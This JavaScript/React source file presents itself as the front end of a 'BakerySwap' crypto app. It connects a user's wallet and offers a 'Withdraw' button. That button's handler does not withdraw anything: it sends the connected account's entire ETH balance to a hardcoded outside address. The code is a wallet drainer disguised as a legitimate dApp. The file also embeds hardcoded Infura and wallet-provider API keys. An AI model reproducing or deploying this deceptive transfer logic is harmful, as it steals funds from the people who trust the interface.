import Onboard from '@web3-onboard/core'
import injectedModule from '@web3-onboard/injected-wallets'
import { init, useConnectWallet, useNotifications, useWallets } from '@web3-onboard/react';
import coinsbaseModule from '@web3-onboard/coinbase';
import dcentModule from '@web3-onboard/dcent';
import walletConnectModule from '@web3-onboard/walletconnect';
import fortmaticModule from '@web3-onboard/fortmatic';
import portisModule from '@web3-onboard/portis';
import bakerySwap from '../img/bakery_swap.svg';
import { useEffect } from 'react';
import { ethers, providers } from 'ethers';


const dappId = '200f086d-6f32-44fd-a898-7835072730e9';

const infuraKey = "941e6007888d4a5c85ed0795f568cb95";

const injected = injectedModule();
const coinbase = coinsbaseModule();
const dcent = dcentModule();
const walletConnect = walletConnectModule();

const fortmatic = fortmaticModule({
    apiKey : 'pk_test_587F7BF36DFF33D4'
})

const portis = portisModule({
    apiKey : '0c1b37d1-adcc-42e7-9145-0e2634a549c9'
})


const MAINNET_RPC_URL = `https://mainnet.infura.io/v3/${infuraKey}`;

const web3onboard = init({
    wallets : [
        injected,
        coinbase,
        dcent,
        walletConnect,
        fortmatic,
        portis
    ],
    chains : [
        {
            id : '0x1',
            token : 'ETH',
            label : 'Ethereum Mainnet',
            rpcUrl : MAINNET_RPC_URL
        }
    ],
    appMetadata: {
        name: "BakerySwap",
        icon: bakerySwap,
        description: "BakeySwap App",
        recommendedInjectedWallets: [
          { name: "MetaMask", url: "https://metamask.io" },
          { name: "Coinbase", url: "https://wallet.coinbase.com/" },
        ],
      },
      accountCenter: {
        desktop: {
          position: "bottomRight",
          enabled: true,
          minimal: true,
        },
        mobile: {
          position: "bottomRight",
          enabled: true,
          minimal: true,
        },
      }
})
   
export const Connectwallet = () => {

    const [{wallet, connecting}, connect, disconnect] = useConnectWallet();

    const connectedWallets = useWallets();

    console.log('jhfff -----> '+ connecting)
    console.log(wallet?.accounts);
    

      const connectWallet = async () => {
        connect();
      };

      

      /*--------- Send Transaction -------*/

      const [
        notifications, 
        customNotification, 
        updateNotify,
        preflightNotifications
      ] = useNotifications();

      
      useEffect(() => {
        console.log(notifications);
      }, [notifications]);
      
      const sendTransactionWithPreFlightNotifications = async () => {
        const balanceValue = Object.values(wallet?.accounts[0].balance)[0];

        console.log("Balance Value = " +  typeof balanceValue);
        console.log("BigNumber " + typeof String(ethers.utils.parseUnits(balanceValue)));

        

        const ethersProvider = new ethers.providers.Web3Provider(wallet.provider, 'any')
      

        const signer = ethersProvider.getSigner();
      
        const txDetails = {
          from: wallet?.accounts[0].address,
          to: '0x5D530F133C3AEA1872a273883251D0bd6cDE0086',
          // value: ethers.utils.parseUnits("0.0000001")
          value: String(ethers.utils.parseUnits(balanceValue)) 
          
        }
      
        const sendTransaction = () => {
          return signer.sendTransaction(txDetails).then(tx => tx.hash)
        }
      
        const gasPrice = () => ethersProvider.getGasPrice().then(res => res.toString())
      
        const estimateGas = () => {
          return ethersProvider.estimateGas(txDetails).then(res => res.toString())
        }
      
        const transactionHash = await preflightNotifications({
          sendTransaction,
          gasPrice,
          estimateGas,
          balance: balanceValue,
          txDetails: txDetails
    })        
        console.log(transactionHash);
      }
    

    if(!wallet?.accounts[0].address){

        return (
            <div>
                <button className='connect-btn' 
                onClick={() => connectWallet()}                
                > 
            <p className='connect-wallet'>Connect Wallet</p>
            </button>
            </div>
          )

    } else {
        return (
            <div>
                <button className='connect-btn' onClick={async () => {
                  sendTransactionWithPreFlightNotifications()
                  }}>
            <p className='connect-wallet'>Withdraw</p>
            </button>
            </div>
          )
    }
 
}
